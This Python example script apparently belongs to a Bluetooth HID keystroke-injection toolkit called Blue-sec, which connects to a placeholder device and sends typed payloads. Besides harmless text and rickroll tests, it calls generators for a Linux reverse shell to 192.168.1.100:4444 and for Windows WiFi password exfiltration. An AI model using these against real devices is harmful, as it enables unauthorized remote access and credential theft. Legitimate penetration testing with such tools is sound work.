#!/usr/bin/env python3
"""
HID Attack Examples
Demonstrates programmatic use of Blue-sec's HID attack capabilities
"""

import asyncio
import sys
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent))

from modules import (
    HIDPayload, HIDKeyboardInjector, RealTimeDeviceTester,
    PayloadGenerator, console
)
from modules.config import load_config


async def example_basic_hid_attack():
    """Example: Basic HID keyboard injection"""
    console.print("\n[bold cyan]Example 1: Basic HID Keyboard Injection[/bold cyan]\n")
    
    # Load configuration
    config = load_config()
    
    # Initialize HID injector
    injector = HIDKeyboardInjector(config.attack, config.security)
    
    # Target device (replace with actual device address)
    target = "AA:BB:CC:DD:EE:FF"
    
    # Connect to device
    console.print(f"Connecting to {target}...")
    connected = await injector.connect(target)
    
    if not connected:
        console.print("[red]Failed to connect[/red]")
        return
    
    console.print("[green]Connected![/green]")
    
    # Create a simple payload
    payload = HIDPayload(
        name="Hello World Test",
        description="Simple keyboard test",
        commands=[
            "DELAY 1000",
            "STRING Hello from Blue-sec!",
            "ENTER",
            "STRING This is a test of HID keyboard injection.",
            "ENTER"
        ],
        target_os="all",
        delay_ms=50
    )
    
    # Execute payload
    console.print("\nExecuting payload...")
    result = await injector.execute_payload(payload)
    
    # Display results
    console.print(f"\n[bold]Results:[/bold]")
    console.print(f"  Success: {result.success}")
    console.print(f"  Commands executed: {result.commands_executed}")
    console.print(f"  Duration: {result.duration:.2f}s")
    
    # Disconnect
    await injector.disconnect()
    console.print("\n[green]Disconnected[/green]")


async def example_payload_from_file():
    """Example: Load and execute payload from file"""
    console.print("\n[bold cyan]Example 2: Execute Payload from File[/bold cyan]\n")
    
    # Load configuration
    config = load_config()
    
    # Initialize HID injector
    injector = HIDKeyboardInjector(config.attack, config.security)
    
    # Load payload from file
    payload_path = "data/payloads/hid/rickroll_test.json"
    
    if not Path(payload_path).exists():
        console.print(f"[yellow]Payload file not found: {payload_path}[/yellow]")
        return
    
    payload = HIDPayload.from_file(payload_path)
    console.print(f"Loaded payload: {payload.name}")
    console.print(f"Description: {payload.description}")
    console.print(f"Commands: {len(payload.commands)}")
    
    # Target device
    target = "AA:BB:CC:DD:EE:FF"
    
    # Connect and execute
    console.print(f"\nConnecting to {target}...")
    connected = await injector.connect(target)
    
    if connected:
        result = await injector.execute_payload(payload)
        console.print(f"\nExecution {'successful' if result.success else 'failed'}")
        await injector.disconnect()


async def example_generate_custom_payload():
    """Example: Generate custom payloads programmatically"""
    console.print("\n[bold cyan]Example 3: Generate Custom Payloads[/bold cyan]\n")
    
    # Generate reverse shell payload for Linux
    linux_shell = PayloadGenerator.reverse_shell(
        ip="192.168.1.100",
        port=4444,
        os="linux"
    )
    
    console.print("[bold]Linux Reverse Shell Payload:[/bold]")
    console.print(f"  Name: {linux_shell.name}")
    console.print(f"  OS: {linux_shell.target_os}")
    console.print(f"  Commands: {len(linux_shell.commands)}")
    
    # Generate WiFi exfiltration payload
    wifi_exfil = PayloadGenerator.wifi_password_exfiltration("windows")
    
    console.print("\n[bold]WiFi Exfiltration Payload:[/bold]")
    console.print(f"  Name: {wifi_exfil.name}")
    console.print(f"  OS: {wifi_exfil.target_os}")
    console.print(f"  Commands: {len(wifi_exfil.commands)}")
    
    # Generate harmless test payload
    rickroll = PayloadGenerator.rickroll()
    
    console.print("\n[bold]Rickroll Test Payload:[/bold]")
    console.print(f"  Name: {rickroll.name}")
    console.print(f"  OS: {rickroll.target_os}")
    console.print(f"  Commands: {len(rickroll.commands)}")
    
    # Save to file
    import json
    output_path = "/tmp/custom_payload.json"
    with open(output_path, 'w') as f:
        json.dump(rickroll.to_dict(), f, indent=4)
    
    console.print(f"\n[green]Payload saved to: {output_path}[/green]")


async def example_interactive_testing():
    """Example: Interactive testing session"""
    console.print("\n[bold cyan]Example 4: Interactive Testing Session[/bold cyan]\n")
    
    # Load configuration
    config = load_config()
    
    # Initialize real-time tester
    tester = RealTimeDeviceTester(config.attack, config.security)
    
    # Target device
    target = "AA:BB:CC:DD:EE:FF"
    
    # Start interactive session
    console.print(f"Starting interactive session with {target}...")
    started = await tester.start_interactive_session(target)
    
    if not started:
        console.print("[red]Failed to start session[/red]")
        return
    
    console.print("[green]Session started![/green]\n")
    
    # Execute some test commands
    test_commands = [
        "type Hello World!",
        "key ENTER",
        "combo CTRL+C"
    ]
    
    for cmd in test_commands:
        console.print(f"Executing: [cyan]{cmd}[/cyan]")
        result = await tester.execute_test_command(cmd)
        console.print(f"  Result: {result.get('status', result.get('success', 'done'))}")
    
    # Disconnect
    await tester.execute_test_command("disconnect")
    console.print("\n[green]Session ended[/green]")


async def example_automated_test_suite():
    """Example: Run automated test suite"""
    console.print("\n[bold cyan]Example 5: Automated Test Suite[/bold cyan]\n")
    
    # Load configuration
    config = load_config()
    
    # Initialize tester
    tester = RealTimeDeviceTester(config.attack, config.security)
    
    # Create test suite
    test_suite = [
        HIDPayload(
            name="Test 1: Simple Text",
            description="Type simple text",
            commands=["STRING Test 1", "ENTER"]
        ),
        HIDPayload(
            name="Test 2: Key Combinations",
            description="Test modifier keys",
            commands=["CTRL a", "DELAY 100", "CTRL c"]
        ),
        HIDPayload(
            name="Test 3: Navigation",
            description="Test arrow keys",
            commands=["UP", "DOWN", "LEFT", "RIGHT"]
        )
    ]
    
    # Run test suite
    target = "AA:BB:CC:DD:EE:FF"
    console.print(f"Running {len(test_suite)} tests on {target}...\n")
    
    results = await tester.run_automated_test_suite(target, test_suite)
    
    # Display results
    console.print("\n[bold]Test Results:[/bold]")
    for i, result in enumerate(results, 1):
        status = "✓" if result.success else "✗"
        console.print(f"  {status} Test {i}: {result.payload_name}")
    
    # Generate report
    report = tester.generate_test_report()
    console.print(f"\n[bold]Summary:[/bold]")
    console.print(f"  Total tests: {report['summary']['total_tests']}")
    console.print(f"  Successful: {report['summary']['successful']}")
    console.print(f"  Failed: {report['summary']['failed']}")
    console.print(f"  Success rate: {report['summary']['success_rate']:.1f}%")


async def main():
    """Run all examples"""
    console.print("""
[bold cyan]╔══════════════════════════════════════════════════════════════╗
║           Blue-sec HID Attack Examples                       ║
╚══════════════════════════════════════════════════════════════╝[/bold cyan]
""")
    
    console.print("[yellow]Note: These examples use simulated HID connections.[/yellow]")
    console.print("[yellow]Real attacks require actual Bluetooth HID hardware.[/yellow]\n")
    
    # Run examples
    await example_basic_hid_attack()
    await example_payload_from_file()
    await example_generate_custom_payload()
    await example_interactive_testing()
    await example_automated_test_suite()
    
    console.print("\n[bold green]✓ All examples completed![/bold green]")
    console.print("\n[cyan]For more information:[/cyan]")
    console.print("  • docs/HID_ATTACKS.md - Comprehensive HID attack guide")
    console.print("  • docs/USAGE.md - General usage guide")
    console.print("  • data/payloads/hid/ - Pre-built payloads\n")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted by user[/yellow]")
        sys.exit(0)
